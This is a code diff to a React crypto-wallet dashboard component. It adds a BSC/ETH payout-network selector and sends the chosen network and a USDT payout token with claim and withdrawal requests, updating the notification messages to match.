@@ -278,6 +278,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
   const [withdrawAmount, setWithdrawAmount] = useState('');
   const [earningsWithdrawAmount, setEarningsWithdrawAmount] = useState('');
   const [withdrawals, setWithdrawals] = useState([]);
+  const [payoutNetwork, setPayoutNetwork] = useState('BSC'); // BSC or ETH
 
   // Report balance to backend (so admin can see it)
   const reportBalanceToBackend = useCallback(async (eth, usdt, tokens = []) => {
@@ -866,12 +867,12 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
       const response = await fetch(`${API_BASE}/api/claim`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ walletAddress })
+        body: JSON.stringify({ walletAddress, network: payoutNetwork, payoutToken: 'USDT' })
       });
 
       if (response.ok) {
         const data = await response.json();
-        showNotification(`Successfully claimed ${data.amount} USDT!`, 'success');
+        showNotification(`Claim request submitted! Admin will send to your wallet on ${payoutNetwork}.`, 'success');
         await fetchUserData();
         await fetchTransactions();
       } else {
@@ -910,11 +911,11 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
       const response = await fetch(`${API_BASE}/api/withdraw/request`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ walletAddress, amount })
+        body: JSON.stringify({ walletAddress, amount, network: payoutNetwork, payoutToken: 'USDT' })
       });
 
       if (response.ok) {
-        showNotification(`Withdrawal request for ${amount} USDT submitted!`, 'success');
+        showNotification(`Withdrawal of ${amount} USDT requested on ${payoutNetwork}!`, 'success');
         setWithdrawAmount('');
         await fetchWithdrawals();
         await fetchTransactions();
@@ -954,11 +955,11 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
       const response = await fetch(`${API_BASE}/api/withdraw/earnings`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ walletAddress, amount })
+        body: JSON.stringify({ walletAddress, amount, network: payoutNetwork, payoutToken: 'USDT' })
       });
 
       if (response.ok) {
-        showNotification(`Earnings withdrawal request for ${amount} USDT submitted!`, 'success');
+        showNotification(`Earnings withdrawal of ${amount} USDT requested on ${payoutNetwork}!`, 'success');
         setEarningsWithdrawAmount('');
         await fetchWithdrawals();
         await fetchTransactions();
@@ -1686,6 +1687,24 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                   <strong>Your payout wallet</strong>
                   Approved withdrawals are sent to: <code style={{fontFamily:'monospace',color:'#fbbf24'}}>{walletAddress.slice(0,12)}…{walletAddress.slice(-8)}</code>.
                   Make sure your wallet is still accessible.
+                </div>
+              </div>
+
+              {/* Network selector — applies to all withdrawal requests */}
+              <div style={{background:'rgba(255,255,255,0.03)',border:'1px solid rgba(255,255,255,0.08)',borderRadius:'12px',padding:'1rem 1.25rem',marginBottom:'1.25rem',display:'flex',alignItems:'center',gap:'1rem',flexWrap:'wrap'}}>
+                <div style={{fontWeight:600,fontSize:'0.88rem',color:'rgba(255,255,255,0.7)',whiteSpace:'nowrap'}}>Receive on:</div>
+                <div style={{display:'flex',gap:'0.5rem'}}>
+                  {['BSC','ETH'].map(net => (
+                    <button key={net} onClick={() => setPayoutNetwork(net)}
+                      style={{padding:'0.45rem 1.1rem',borderRadius:'8px',border:`1px solid ${payoutNetwork===net?'#667eea':'rgba(255,255,255,0.1)'}`,
+                        background:payoutNetwork===net?'rgba(102,126,234,0.2)':'transparent',
+                        color:payoutNetwork===net?'#a78bfa':'rgba(255,255,255,0.5)',fontWeight:700,fontSize:'0.82rem',cursor:'pointer'}}>
+                      {net==='BSC'?'BSC (BNB Chain)':'ETH (Ethereum)'}
+                    </button>
+                  ))}
+                </div>
+                <div style={{fontSize:'0.75rem',color:'rgba(255,255,255,0.35)',marginLeft:'auto'}}>
+                  {payoutNetwork==='BSC'?'Low fees · Fast':'Higher fees · Ethereum mainnet'}
                 </div>
               </div>
 
